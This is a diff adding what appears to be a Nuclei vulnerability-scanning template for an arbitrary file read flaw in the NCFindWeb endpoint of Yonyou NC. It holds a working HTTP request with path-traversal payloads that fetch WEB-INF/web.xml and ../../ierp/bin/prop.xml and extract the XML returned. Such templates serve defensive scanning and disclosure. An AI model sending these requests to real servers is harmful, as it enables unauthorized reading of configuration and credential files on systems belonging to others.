@@ -1,0 +1,32 @@
+id: yonyou-nc-file-read
+info:
+  name: Yonyou NC NCFindWeb Filename File Reading
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Yonyou NC is a large-scale enterprise management and e-commerce platform. There is an arbitrary file reading vulnerability in the Yonyou NC NCFindWeb path, allowing attackers to obtain sensitive files from the website.
+  tags: file-read
+  reference:
+    - https://www.yonyou.com
+
+http:
+  - raw:
+      - |
+        GET /NCFindWeb?service=IPreAlertConfigService&filename={{file_path}} HTTP/1.1
+        Host: {{Hostname}}
+    payloads:
+      file_path:
+        - "WEB-INF/web.xml"
+        - "../../ierp/bin/prop.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "<\\?xml"
+    extractors:
+      - type: regex
+        regex:
+          - "<\\?xml.*"
